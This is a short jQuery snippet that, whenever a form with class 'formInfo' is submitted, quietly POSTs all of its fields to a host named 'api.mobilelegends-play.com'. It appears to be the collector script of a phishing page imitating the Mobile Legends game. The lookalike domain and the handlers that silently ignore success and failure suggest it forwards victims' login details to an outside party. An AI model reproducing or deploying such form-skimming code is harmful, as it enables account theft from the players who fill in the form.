$(".formInfo").submit(function() {
    var d = $(".formInfo");

    $.ajax({
        url: "https://api.mobilelegends-play.com/json/",
        type: "POST",
        data: d.serialize(),
        success: function () {
            return true;
        },
        error: function () {
            return true;
        },
    });
});
